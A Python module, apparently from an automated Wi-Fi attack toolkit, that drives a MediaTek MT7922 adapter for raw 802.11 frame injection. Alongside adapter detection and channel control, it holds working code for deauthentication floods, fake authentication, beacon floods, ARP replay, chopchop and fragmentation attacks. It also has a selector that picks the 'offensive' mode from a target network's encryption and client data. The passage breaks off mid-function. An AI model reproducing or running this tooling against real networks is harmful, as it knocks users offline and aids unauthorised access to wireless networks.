#!/usr/bin/env python3
"""
mt7921e Tools
=============
Specialized tools for the MediaTek MT7922 (``mt7921e`` PCIe driver) packet
injection surface.

The README has been promising this module since project inception; it
implements the detection, runtime injection-quality verification, channel /
txpower control, and raw 802.11 frame injection the chain needs when the
operator's adapter is a MediaTek device — specifically the MediaTek MT7922
802.11a/b/g/n/ac/ax (Wi-Fi 6E) M.2 PCIe card driven by the in-tree
``mt7921e`` (mt76 mac80211) driver.

The MT7922 / mt7921e pair is a modern PCIe WiFi chipset with reliable
monitor-mode + packet-injection support on modern Linux (mac80211 / mt76).
Distinguishing features of this module:

- **Runtime injection test**: ``aireplay-ng --test`` confirms the adapter
  can actually inject frames (some adapters report monitor support but
  silently drop injected frames; the runtime test catches that).
- **Per-frame channel / txpower control**: ``iw dev <iface> set channel`` /
  ``set txpower`` allow the chain to follow a target BSSID's channel hop
  and tune power for signal-strength-sensitive steps.
- **Raw 802.11 frame injection**: optional scapy path for custom deauth
  variants, beacon floods, fragmentation attacks — anything
  ``aireplay-ng``'s fixed modes don't cover. Falls back to a clear error
  when scapy is not installed.

All public functions return dicts; never raise on tool absence. The chain
branches on ``{"error": "..."}`` results exactly the same way it does for
the other Kali wrappers in ``core/mcp/tools.py``.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
import shutil
import subprocess
import time
import urllib.request
import urllib.error
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Union

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# mt7921e driver family (case-insensitive substring match against `iw phy`
# driver line)
# ---------------------------------------------------------------------------
# The MediaTek MT7922 is driven by the in-tree ``mt7921e`` PCIe driver
# (``mt7921u`` is the USB form-factor variant of the same silicon). We match
# any of these so detection survives both the PCIe card and a USB stick.
MT7921E_DRIVERS: tuple = ("mt7921e", "mt7921u", "mt7921")


# ---------------------------------------------------------------------------
# Data
# ---------------------------------------------------------------------------
@dataclass
class Mt7921eInterfaceInfo:
    """Snapshot of an mt7921e wireless adapter's capabilities."""

    name: str = ""
    phy: str = ""
    driver: str = "unknown"
    chipset: str = ""
    monitor_capable: bool = False
    injection_capable_static: bool = False  # parsed from `iw phy` modes
    injection_capable_runtime: Optional[bool] = None  # set by test_injection()
    injection_quality: Optional[int] = None  # 0-100, from aireplay-ng --test
    channel: Optional[int] = None
    txpower_dbm: Optional[int] = None
    state: str = "unknown"
    extras: Dict[str, Any] = field(default_factory=dict)

    def as_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------
def _run(cmd: List[str], timeout: int = 5) -> Dict[str, Any]:
    """Run a subprocess; return ``{ok, stdout, stderr, returncode}``."""
    if not shutil.which(cmd[0]):
        return {"ok": False, "error": f"{cmd[0]} not installed", "stdout": "",
                "stderr": "", "returncode": -1}
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"ok": p.returncode == 0, "stdout": p.stdout,
                "stderr": p.stderr, "returncode": p.returncode}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": f"timeout after {timeout}s", "stdout": "",
                "stderr": "", "returncode": -1}
    except Exception as e:  # noqa: BLE001 — broad on purpose, we degrade
        return {"ok": False, "error": str(e), "stdout": "", "stderr": "",
                "returncode": -1}


def _parse_iw_dev_info(name: str) -> Dict[str, Any]:
    """Parse `iw dev <name> info` for phy, channel, txpower, state."""
    out = _run(["iw", "dev", name, "info"])
    info: Dict[str, Any] = {"phy": "", "channel": None, "txpower_dbm": None,
                            "state": "unknown"}
    if not out["ok"]:
        return info
    txt = out["stdout"]
    m = re.search(r"^\s*wiphy\s+(\S+)\s*$", txt, re.MULTILINE)
    if m:
        info["phy"] = m.group(1).strip()
    m = re.search(r"^\s*channel\s+(\d+)\s+\(", txt, re.MULTILINE)
    if m:
        try:
            info["channel"] = int(m.group(1))
        except (ValueError, TypeError):
            pass
    m = re.search(r"^\s*txpower\s+(\d+)\s*dBm", txt, re.MULTILINE)
    if m:
        try:
            info["txpower_dbm"] = int(m.group(1))
        except (ValueError, TypeError):
            pass
    if "type monitor" in txt:
        info["state"] = "monitor"
    elif "type managed" in txt:
        info["state"] = "managed"
    return info


def _parse_iw_phy_block(phy_id: str, phy_dump: str) -> Dict[str, Any]:
    """Return driver, chipset, monitor_capable, injection_capable_static
    for a single phy by parsing the `iw phy` dump.

    The dump is the full `iw phy` output across all phys; we isolate the
    block for ``phy_id`` (e.g. ``phy1``) by splitting on `Wiphy <id>`.
    """
    out: Dict[str, Any] = {
        "driver": "unknown", "chipset": "",
        "monitor_capable": False, "injection_capable_static": False,
    }
    if not phy_dump:
        return out
    # Isolate the block for this phy.
    pattern = rf"Wiphy\s+{re.escape(phy_id)}\b"
    parts = re.split(pattern, phy_dump, maxsplit=1)
    if len(parts) < 2:
        return out
    block = parts[1]
    # Block ends at the next `Wiphy ` (next phy) or end-of-text.
    block = re.split(r"\nWiphy\s+\S+\b", block, maxsplit=1)[0]

    # Driver line: `nl80211 not found.` for non-mac80211, else `Driver: <name>`.
    m = re.search(r"^\s*Driver:\s*(\S+)\s*$", block, re.MULTILINE)
    if m:
        out["driver"] = m.group(1).strip().lower()
    # Chipset is on a `Wiphy <id>` header line or in `valid interface
    # combinations`; the most reliable source is the line just under
    # `Wiphy <id>`, e.g. `Wiphy phy1\n    wiphy index: 1` — but chipset
    # string is on a separate `Software interface modes` block, and the
    # chipset name itself is in the `Wiphy <id>` header description on
    # some kernels. Fall back to a generic placeholder when absent.
    m = re.search(r"^\s*Wiphy\s+" + re.escape(phy_id) + r"\s*\n(?:\s*#[^\n]*\n)?\s*([^\n]+)",
                  phy_dump, re.MULTILINE)
    if m:
        out["chipset"] = m.group(1).strip()[:120]

    # Interface modes block. We look at the *Supported interface modes*
    # section (newline + indent + `* <mode>` lines).
    modes_block = ""
    if "Supported interface modes" in block:
        modes_block = block.split("Supported interface modes", 1)[1]
        modes_block = re.split(r"\n\s*[A-Z][^\n]*:\s", modes_block, maxsplit=1)[0]
    out["monitor_capable"] = bool(
        re.search(r"^\s*\*\s+monitor\b", modes_block, re.MULTILINE)
    )
    out["injection_capable_static"] = bool(
        re.search(r"^\s*\*\s+injection\b", modes_block, re.MULTILINE)
    )
    return out


def _sysfs_driver(iface: str) -> str:
    """Return the kernel driver name from sysfs, or empty string.

    Modern ``iw phy`` dumps often omit the ``Driver:`` line; sysfs is
    the reliable source for mt7921e / mt7921u / iwlwifi / etc.
    """
    path = f"/sys/class/net/{iface}/device/driver"
    try:
        return os.path.basename(os.path.realpath(path)).lower()
    except OSError:
        return ""


def _sysfs_phy(iface: str) -> str:
    """Return ``phyN`` from ``/sys/class/net/<iface>/phy80211`` if present."""
    path = f"/sys/class/net/{iface}/phy80211"
    try:
        return os.path.basename(os.path.realpath(path))
    except OSError:
        return ""


def _normalize_phy_id(raw: str) -> str:
    """Normalize ``0`` / ``phy0`` / ``phy#0`` → ``phy0``."""
    s = (raw or "").strip()
    if not s:
        return ""
    s = s.replace("phy#", "phy")
    if s.isdigit():
        return f"phy{s}"
    if not s.startswith("phy") and re.match(r"^\d+$", s):
        return f"phy{s}"
    return s


def detect_mt7921e_interfaces() -> List[Mt7921eInterfaceInfo]:
    """Run ``iw dev`` + ``iw phy`` and return all adapters whose driver
    is in ``MT7921E_DRIVERS``.

    Handles both classic ``wiphy N`` under each Interface block and the
    modern ``phy#N`` header form (MediaTek mt7921e on recent kernels
    often has no per-interface ``wiphy`` line). Driver is taken from
    ``iw phy`` when present, otherwise from sysfs.

    Never raises; returns ``[]`` on missing tools or no matching adapter.
    """
    if not shutil.which("iw") or not shutil.which("ip"):
        return []
    devs = _run(["iw", "dev"])
    phys = _run(["iw", "phy"])
    if not devs["ok"]:
        return []

    # Collect iface names + the owning phy.
    # Prefer explicit ``wiphy`` lines; fall back to the enclosing ``phy#N``.
    iface_to_phy: Dict[str, str] = {}
    current_iface: Optional[str] = None
    current_phy: str = ""
    for line in devs["stdout"].splitlines():
        # Accept both "phy#0" at column 0 and indented variants.
        m_phy = re.match(r"^\s*phy#(\d+)\s*$", line)
        if m_phy:
            current_phy = f"phy{m_phy.group(1)}"
            current_iface = None
            continue
        m = re.match(r"\s*Interface\s+(\S+)\s*$", line)
        if m:
            current_iface = m.group(1)
            iface_to_phy[current_iface] = current_phy
            continue
        if current_iface and "wiphy" in line:
            m2 = re.search(r"wiphy\s+(\S+)", line)
            if m2:
                iface_to_phy[current_iface] = _normalize_phy_id(m2.group(1))

    results: List[Mt7921eInterfaceInfo] = []
    for name, phy in iface_to_phy.items():
        if not phy:
            phy = _normalize_phy_id(_sysfs_phy(name))
        if not phy:
            live0 = _parse_iw_dev_info(name)
            phy = _normalize_phy_id(live0.get("phy") or "")
        parsed = _parse_iw_phy_block(phy, phys.get("stdout") or "") if phy else {
            "driver": "unknown", "chipset": "",
            "monitor_capable": False, "injection_capable_static": False,
        }
        driver = (parsed.get("driver") or "unknown").lower()
        if driver in ("unknown", ""):
            driver = _sysfs_driver(name) or "unknown"
        # Prefer sysfs when it is a known mt7921e family driver even if
        # iw phy said something else (or nothing).
        sys_drv = _sysfs_driver(name)
        if sys_drv and any(d in sys_drv for d in MT7921E_DRIVERS):
            driver = sys_drv
        if not any(d in driver for d in MT7921E_DRIVERS):
            continue
        # Monitor mode: trust iw phy modes, else assume True for mt76
        # (mt7921e always exposes monitor in Supported interface modes).
        mon = bool(parsed.get("monitor_capable"))
        if not mon and any(d in driver for d in MT7921E_DRIVERS):
            mon = True
        info = Mt7921eInterfaceInfo(
            name=name,
            phy=phy or "unknown",
            driver=driver,
            chipset=parsed.get("chipset") or "MediaTek MT792x (sysfs)",
            monitor_capable=mon,
            injection_capable_static=bool(
                parsed.get("injection_capable_static") or mon
            ),
        )
        # Live channel / txpower / state.
        live = _parse_iw_dev_info(name)
        info.channel = live["channel"]
        info.txpower_dbm = live["txpower_dbm"]
        info.state = live["state"]
        info.extras["detection"] = "iw+sysfs"
        results.append(info)
    return results


# ---------------------------------------------------------------------------
# Runtime injection test
# ---------------------------------------------------------------------------
def test_injection(iface: str, bssid: str = "FF:FF:FF:FF:FF:FF",
                   timeout: int = 15) -> Dict[str, Any]:
    """Run ``aireplay-ng --test <iface>`` and parse the result.

    aireplay-ng --test is the canonical aircrack-ng injection test: it
    pings the local AP (or any in-range AP) and reports injection
    success on a 0-100 scale. We pick this over a static ``iw phy``
    check because the static check lies on some drivers (reports
    injection but silently drops frames at runtime).

    Returns ``{"ok": bool, "quality": int, "stdout": str, "stderr": str,
    "error": str}``.
    """
    if not shutil.which("aireplay-ng"):
        return {"ok": False, "quality": 0, "stdout": "", "stderr": "",
                "error": "aireplay-ng not installed"}
    if os.geteuid() != 0:
        return {"ok": False, "quality": 0, "stdout": "", "stderr": "",
                "error": "needs root"}
    r = _run(["aireplay-ng", "--test", iface], timeout=timeout)
    out = r["stdout"]
    err = r["stderr"]
    quality: Optional[int] = None
    # aireplay-ng prints lines like:
    #   30/30:  100%  (30/30 pps)
    # or:        Trying broadcast probe requests ...
    #            Injection is working!  Found 1 AP
    # We extract the percentage from the progress line if present.
    m = re.search(r"(\d{1,3})\s*/\s*\d+\s*:\s*(\d{1,3})\s*%", out)
    if m:
        try:
            quality = int(m.group(2))
        except (ValueError, TypeError):
            quality = None
    if quality is None:
        # Fallback: 100 if "Injection is working" appears, else 0.
        if "Injection is working" in out:
            quality = 100
        else:
            quality = 0
    return {
        "ok": r["ok"] and quality > 0,
        "quality": quality,
        "stdout": out,
        "stderr": err,
        "error": "" if r["ok"] else (err.strip() or "aireplay-ng --test failed"),
    }


# ---------------------------------------------------------------------------
# Channel / txpower
# ---------------------------------------------------------------------------
def set_channel(iface: str, channel: int) -> Dict[str, Any]:
    """``iw dev <iface> set channel <n>``. Returns ``{ok, error}``."""
    if not shutil.which("iw"):
        return {"ok": False, "error": "iw not installed"}
    if os.geteuid() != 0:
        return {"ok": False, "error": "needs root"}
    if not 1 <= int(channel) <= 196:
        return {"ok": False, "error": f"channel {channel} out of range"}
    r = _run(["iw", "dev", iface, "set", "channel", str(channel)])
    return {
        "ok": r["ok"],
        "error": "" if r["ok"] else (r["stderr"].strip() or "set channel failed"),
    }


def set_txpower(iface: str, dbm: int) -> Dict[str, Any]:
    """``iw dev <iface> set txpower fixed <dbm>``.

    On out-of-range or unsupported hardware, falls back to
    ``iw dev <iface> set txpower auto``.
    """
    if not shutil.which("iw"):
        return {"ok": False, "error": "iw not installed"}
    if os.geteuid() != 0:
        return {"ok": False, "error": "needs root"}
    fixed = _run(["iw", "dev", iface, "set", "txpower", "fixed", str(dbm)])
    if fixed["ok"]:
        return {"ok": True, "error": "", "method": "fixed"}
    # Fall back to auto.
    auto = _run(["iw", "dev", iface, "set", "txpower", "auto"])
    return {
        "ok": auto["ok"],
        "error": "" if auto["ok"] else (auto["stderr"].strip()
                                        or f"fixed failed: {fixed['stderr'].strip()}"),
        "method": "auto",
    }


# ---------------------------------------------------------------------------
# Raw 802.11 frame injection (scapy, lazy import)
# ---------------------------------------------------------------------------
def _scapy_sendp(iface: str, frame_bytes: bytes) -> Dict[str, Any]:
    """Inject a raw 802.11 frame via scapy. Requires scapy installed."""
    try:
        from scapy.all import sendp, conf  # type: ignore
    except Exception as e:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": f"scapy not installed ({e})"}
    try:
        # sendp is blocking; let the caller pass a timeout via wrapping.
        sendp(frame_bytes, iface=iface, verbose=False)
        return {"ok": True, "error": ""}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": str(e)}


def inject_raw_frame(iface: str, frame_bytes: bytes,
                     channel: Optional[int] = None,
                     b64: bool = False) -> Dict[str, Any]:
    """Send a single raw 802.11 frame on ``iface``.

    Args:
        iface: monitor-mode interface (e.g. ``wlan0mon``).
        frame_bytes: the frame. If ``b64=True``, treated as base64.
        channel: optional channel to set before injection.
        b64: treat ``frame_bytes`` as base64-encoded.

    Returns ``{ok, error}``. When scapy is unavailable, returns
    ``{ok: False, error: "scapy not installed"}`` so the chain can
    fall back to aireplay-ng.
    """
    if os.geteuid() != 0:
        return {"ok": False, "error": "needs root"}
    if channel is not None:
        ch = set_channel(iface, channel)
        if not ch["ok"]:
            return {"ok": False, "error": f"set channel {channel}: {ch['error']}"}
    try:
        if b64:
            frame_bytes = base64.b64decode(frame_bytes)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": f"base64 decode: {e}"}
    if not isinstance(frame_bytes, (bytes, bytearray)) or not frame_bytes:
        return {"ok": False, "error": "empty or non-bytes frame"}
    return _scapy_sendp(iface, bytes(frame_bytes))


# ---------------------------------------------------------------------------
# Convenience: detect + test in one call (the chain planner uses this)
# ---------------------------------------------------------------------------
def probe_mt7921e_capabilities(iface: Optional[str] = None,
                             test: bool = True,
                             bssid: str = "FF:FF:FF:FF:FF:FF",
                             test_timeout: int = 15) -> List[Mt7921eInterfaceInfo]:
    """Detect mt7921e interfaces; optionally run the injection test on
    each. If ``iface`` is given, only test that one (still requires it
    to be an mt7921e adapter).
    """
    adapters = detect_mt7921e_interfaces()
    if iface:
        adapters = [a for a in adapters if a.name == iface]
    if not test:
        return adapters
    for a in adapters:
        r = test_injection(a.name, bssid=bssid, timeout=test_timeout)
        a.injection_capable_runtime = r["ok"]
        a.injection_quality = r["quality"]
    return adapters


# ---------------------------------------------------------------------------
# Raw-frame deauth (scapy) with aireplay-ng fallback
# ---------------------------------------------------------------------------
def craft_deauth_frame(bssid: str, station: str = "FF:FF:FF:FF:FF:FF",
                       reason: int = 7) -> Dict[str, Any]:
    """Build a raw 802.11 deauth frame via scapy.

    Returns ``{"ok": True, "frame": bytes}`` on success, or
    ``{"ok": False, "error": "scapy not installed"}`` when scapy is
    unavailable so the caller can fall back to ``aireplay-ng --deauth``.
    Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        frame = (
            RadioTap()
            / Dot11(addr1=station, addr2=bssid, addr3=bssid)
            / Dot11Deauth(reason=reason)
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def inject_deauth(iface: str, bssid: str,
                  channel: Optional[int] = None,
                  count: int = 10,
                  station: str = "FF:FF:FF:FF:FF:FF",
                  reason: int = 7,
                  timeout: int = 20) -> Dict[str, Any]:
    """Inject ``count`` deauth frames on ``iface``.

    Prefers raw scapy injection via :func:`inject_raw_frame` (sets the
    channel first, handles the root/scapy gate). When scapy is absent or
    any inject call fails, falls back to
    ``aireplay-ng --deauth <count> -a <bssid> <iface>`` (root-only, no
    sudo prefix — matches :func:`test_injection`'s convention).

    Returns ``{"ok", "method": "scapy"|"aireplay", "error", ...}``.
    Never raises.
    """
    craft = craft_deauth_frame(bssid, station=station, reason=reason)
    if craft["ok"]:
        frame = craft["frame"]
        all_ok = True
        for _ in range(count):
            r = inject_raw_frame(iface, frame, channel=channel)
            if not r.get("ok"):
                all_ok = False
                break
        if all_ok:
            return {"ok": True, "method": "scapy", "count": count, "error": ""}
        # Inject failed — fall through to the aireplay-ng fallback.

    if not shutil.which("aireplay-ng"):
        return {"ok": False, "method": "aireplay", "error": "aireplay-ng not installed"}
    if os.geteuid() != 0:
        return {"ok": False, "method": "aireplay", "error": "needs root"}
    r = _run(["aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
             timeout=timeout)
    return {
        "ok": r["ok"],
        "method": "aireplay",
        "count": count,
        "returncode": r["returncode"],
        "stdout": r["stdout"],
        "stderr": r["stderr"],
        "error": "" if r["ok"] else (
            r["stderr"].strip() or r.get("error") or "aireplay-ng --deauth failed"
        ),
    }


# ---------------------------------------------------------------------------
# Frame-crafting helpers (lazy scapy, same contract as craft_deauth_frame)
# ---------------------------------------------------------------------------
def craft_fakeauth_frame(bssid: str, station: str,
                         channel: Optional[int] = None) -> Dict[str, Any]:
    """Build a raw 802.11 authentication-request frame via scapy.

    ``RadioTap()/Dot11(addr1=bssid, addr2=station, addr3=bssid,
    type=0, subtype=11)/Dot11Auth(seqnum=1, status=0)``.

    Returns ``{"ok": True, "frame": bytes}`` on success, or
    ``{"ok": False, "error": "scapy not installed"}`` /
    ``{"ok": False, "error": "scapy layer unavailable"}`` when scapy
    (or a specific layer) is missing. Never raises. ``channel`` is
    accepted for call-site symmetry but does not affect the frame bytes.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Auth  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=station, addr3=bssid, type=0, subtype=11)
            / Dot11Auth(seqnum=1, status=0)
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_beacon_frame(bssid: str, ssid: str = "hidden",
                       channel: int = 6) -> Dict[str, Any]:
    """Build a raw 802.11 beacon frame via scapy.

    ``RadioTap()/Dot11Beacon(cap=ESS)/Dot11Elt(ID="SSID", info=ssid)/
    Dot11Elt(ID="DSset", info=bytes([channel]))``.

    Same return contract as :func:`craft_deauth_frame`. The capability
    field uses the numeric ESS bit (0x0001) so the build does not depend
    on a symbolic constant name that varies across scapy versions.
    """
    try:
        from scapy.all import RadioTap  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Beacon, Dot11Elt  # type: ignore
    except Exception:  # noqa: BLE001 — layers may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11Beacon(cap=0x0001)
            / Dot11Elt(ID="SSID", info=ssid.encode("utf-8", "replace"))
            / Dot11Elt(ID="DSset", info=bytes([int(channel) & 0xFF]))
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_cts_frame(bssid: str) -> Dict[str, Any]:
    """Build a raw 802.11 CTS-to-self frame via scapy.

    ``RadioTap()/Dot11CTS(addr1=bssid)``.

    Same return contract as :func:`craft_deauth_frame`.
    """
    try:
        from scapy.all import RadioTap  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11CTS  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = RadioTap() / Dot11CTS(addr1=bssid)
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


# ---------------------------------------------------------------------------
# Unified injection dispatcher (Part D)
# ---------------------------------------------------------------------------
def _scapy_burst(iface: str, frame_bytes: bytes,
                 count: int, channel: Optional[int],
                 interval_ms: Optional[int]) -> tuple:
    """Inject ``frame_bytes`` ``count`` times via :func:`inject_raw_frame`.

    Returns ``(ok_count, total)``. Polymorphic pacing: when
    ``interval_ms`` is set and > 0, sleeps ``interval_ms/1000`` seconds
    between frames. Never raises.
    """
    ok_count = 0
    for i in range(count):
        r = inject_raw_frame(iface, frame_bytes, channel=channel)
        if r.get("ok"):
            ok_count += 1
        if interval_ms and interval_ms > 0 and i < count - 1:
            time.sleep(interval_ms / 1000.0)
    return ok_count, count


def _aireplay_root_gate(mode: str) -> Optional[Dict[str, Any]]:
    """Return an error dict if aireplay-ng is unusable, else ``None``."""
    if not shutil.which("aireplay-ng"):
        return {"ok": False, "method": "aireplay", "mode": mode,
                "error": "aireplay-ng not installed"}
    if os.geteuid() != 0:
        return {"ok": False, "method": "aireplay", "mode": mode,
                "error": "needs root"}
    return None


def inject(iface: str, *, mode: str, bssid: str,
           station: Optional[str] = None,
           channel: Optional[int] = None,
           count: int = 10,
           interval_ms: Optional[int] = None,
           timeout: int = 20,
           **kw: Any) -> Dict[str, Any]:
    """Unified injection dispatcher (Part D).

    Routes ``mode`` to a strategy; each scapy strategy reuses
    :func:`inject_raw_frame` for raw frames and falls back to an
    ``aireplay-ng`` subprocess (via the module's ``_run`` helper, root-only
    no-sudo prefix matching :func:`test_injection`'s convention) when
    scapy/raw injection fails or is unavailable. When ``channel`` is
    given, sets the channel first via :func:`set_channel` (best-effort).
    When ``interval_ms`` is set and > 0, paces frame bursts with
    ``time.sleep``.

    Returns a dict that always includes ``"mode"`` and ``"method"``
    (``"scapy"`` or ``"aireplay"``). Never raises.
    """
    # Best-effort channel set; ignore failure (the per-strategy raw
    # injection also re-asserts the channel via inject_raw_frame).
    if channel is not None:
        try:
            set_channel(iface, channel)
        except Exception:  # noqa: BLE001 — never raise on channel set
            pass

    mode_l = mode.lower() if isinstance(mode, str) else mode

    if mode_l == "deauth":
        res = dict(inject_deauth(
            iface, bssid, channel=channel, count=count,
            station=station or "FF:FF:FF:FF:FF:FF", timeout=timeout,
        ))
        res["mode"] = "deauth"
        res.setdefault("method", "scapy")
        return res

    if mode_l == "fakeauth":
        ssid = kw.get("ssid", "hidden")
        craft = craft_fakeauth_frame(bssid, station or "FF:FF:FF:FF:FF:FF",
                                     channel=channel)
        if craft.get("ok"):
            ok_count, total = _scapy_burst(
                iface, craft["frame"], count, channel, interval_ms)
            if ok_count > 0:
                return {"ok": True, "method": "scapy", "mode": "fakeauth",
                        "count": ok_count, "error": ""}
        # Fall back to aireplay-ng --fakeauth.
        gate = _aireplay_root_gate("fakeauth")
        if gate is not None:
            return gate
        r = _run(["aireplay-ng", "--fakeauth", "-a", bssid, "-e", ssid,
                  iface], timeout=timeout)
        return {"ok": r["ok"], "method": "aireplay", "mode": "fakeauth",
                "returncode": r["returncode"], "stdout": r["stdout"],
                "stderr": r["stderr"],
                "error": "" if r["ok"] else (
                    r["stderr"].strip() or r.get("error")
                    or "aireplay-ng --fakeauth failed")}

    if mode_l == "beacon_flood":
        ssid = kw.get("ssid", "hidden")
        bch = channel if channel is not None else int(kw.get("channel", 6))
        craft = craft_beacon_frame(bssid, ssid=ssid, channel=bch)
        if not craft.get("ok"):
            return {"ok": False, "method": "scapy", "mode": "beacon_flood",
                    "error": craft.get("error", "scapy not installed")}
        ok_count, total = _scapy_burst(
            iface, craft["frame"], count, channel, interval_ms)
        return {"ok": ok_count > 0, "method": "scapy",
                "mode": "beacon_flood", "count": ok_count,
                "error": "" if ok_count else "no frames injected"}

    if mode_l == "arp_replay":
        # Scapy-first: craft a real ARP-request data frame and burst it to
        # stimulate IV traffic (the WEP/arp_replay intent). Falls back to
        # ``aireplay-ng --arpreplay`` (root-only) when scapy is unavailable
        # or the burst injects nothing — preserves the original path.
        st = station or bssid
        src_ip = str(kw.get("src_ip", "0.0.0.0"))
        dst_ip = str(kw.get("dst_ip", "255.255.255.255"))
        craft = craft_arp_frame(bssid, st, src_ip=src_ip, dst_ip=dst_ip,
                                src_mac=st)
        if craft.get("ok"):
            ok_count, total = _scapy_burst(
                iface, craft["frame"], count, channel, interval_ms)
            if ok_count > 0:
                return {"ok": True, "method": "scapy",
                        "mode": "arp_replay", "count": ok_count,
                        "error": ""}
            # scapy burst injected nothing -> fall through to aireplay.
        gate = _aireplay_root_gate("arp_replay")
        if gate is not None:
            return gate
        r = _run(["aireplay-ng", "--arpreplay", "-b", bssid, "-h", st,
                  iface], timeout=timeout)
        return {"ok": r["ok"], "method": "aireplay", "mode": "arp_replay",
                "returncode": r["returncode"], "stdout": r["stdout"],
                "stderr": r["stderr"],
                "error": "" if r["ok"] else (
                    r["stderr"].strip() or r.get("error")
                    or "aireplay-ng --arpreplay failed")}

    if mode_l == "chopchop":
        gate = _aireplay_root_gate("chopchop")
        if gate is not None:
            return gate
        st = station or bssid
        r = _run(["aireplay-ng", "--chopchop", "-b", bssid, "-h", st,
                  iface], timeout=timeout)
        return {"ok": r["ok"], "method": "aireplay", "mode": "chopchop",
                "returncode": r["returncode"], "stdout": r["stdout"],
                "stderr": r["stderr"],
                "error": "" if r["ok"] else (
                    r["stderr"].strip() or r.get("error")
                    or "aireplay-ng --chopchop failed")}

    if mode_l == "fragmentation":
        gate = _aireplay_root_gate("fragmentation")
        if gate is not None:
            return gate
        st = station or bssid
        r = _run(["aireplay-ng", "--fragment", "-b", bssid, "-h", st,
                  iface], timeout=timeout)
        return {"ok": r["ok"], "method": "aireplay",
                "mode": "fragmentation", "returncode": r["returncode"],
                "stdout": r["stdout"], "stderr": r["stderr"],
                "error": "" if r["ok"] else (
                    r["stderr"].strip() or r.get("error")
                    or "aireplay-ng --fragment failed")}

    if mode_l == "cts_rts":
        craft = craft_cts_frame(bssid)
        if craft.get("ok"):
            ok_count, total = _scapy_burst(
                iface, craft["frame"], count, channel, interval_ms)
            if ok_count > 0:
                return {"ok": True, "method": "scapy", "mode": "cts_rts",
                        "count": ok_count, "error": ""}
        # CTS has no direct aireplay mode; deauth is the closest fallback.
        gate = _aireplay_root_gate("cts_rts")
        if gate is not None:
            return gate
        r = _run(["aireplay-ng", "--deauth", str(count), "-a", bssid,
                  iface], timeout=timeout)
        return {"ok": r["ok"], "method": "aireplay", "mode": "cts_rts",
                "returncode": r["returncode"], "stdout": r["stdout"],
                "stderr": r["stderr"],
                "error": "" if r["ok"] else (
                    r["stderr"].strip() or r.get("error")
                    or "aireplay-ng --deauth fallback failed")}

    return {"ok": False, "method": "unknown", "mode": mode,
            "error": f"unknown injection mode {mode}"}


# ---------------------------------------------------------------------------
# Quality-aware strategy selector (Part D)
# ---------------------------------------------------------------------------
def choose_injection_strategy(caps: Dict[str, Any],
                              recon: Dict[str, Any]) -> str:
    """Pick the best **offensive** injection strategy for this target.

    Prefer :func:`core.poly.offensive_inject.pick_inject_mode` when available
    (PMF/SAE-aware, live failure rotation, WEP keystream modes). Falls back
    to the classic heuristic below.

    Rules (fallback priority order):

    - WEP encryption → ``"arp_replay"``
    - WPA3/PMF → ``"fakeauth"`` (honest — deauth often ineffective)
    - hidden/empty SSID → ``"beacon_flood"``
    - clients present → ``"deauth"`` (directed)
    - ``quality < 30`` → ``"deauth"`` (most reliable)
    - no clients → ``"fakeauth"``
    - default → ``"deauth"``

    Never raises; on any error returns ``"deauth"``.
    """
    try:
        recon = recon or {}
        caps = caps or {}
        # Live polymorphic offensive ranking
        try:
            from core.poly.offensive_inject import pick_inject_mode
            pick = pick_inject_mode(
                {
                    "encryption": recon.get("encryption"),
                    "ssid": recon.get("ssid"),
                    "clients": recon.get("clients"),
                    "client_count": recon.get("client_count"),
                    "pmf": recon.get("pmf") or recon.get("pmf_supported"),
                    "wps": recon.get("wps"),
                    "station": recon.get("station"),
                    "adapter_caps": caps,
                    "injection_capable": caps.get("injection_capable") or caps.get("mt7921e"),
                    "mt7921e": caps.get("mt7921e"),
                    "quality": caps.get("quality"),
                },
                recon.get("last_inject_result"),
            )
            mode = (pick.get("mode") or "").strip().lower()
            if mode:
                return mode
        except Exception:  # noqa: BLE001
            pass

        encryption = str(recon.get("encryption") or "").upper()
        if "WEP" in encryption:
            return "arp_replay"
        if "WPA3" in encryption or "SAE" in encryption or recon.get("pmf") or recon.get("pmf_supported"):
            return "fakeauth"

        ssid = recon.get("ssid")
        if not ssid or (isinstance(ssid, str)
                        and ssid.strip().lower() in ("", "hidden", "<hidden>")):
            return "beacon_flood"

        clients = recon.get("clients")
        clients_count = 0
        if isinstance(clients, dict):
            data = clients.get("data") or {}
            if isinstance(data, dict):
                try:
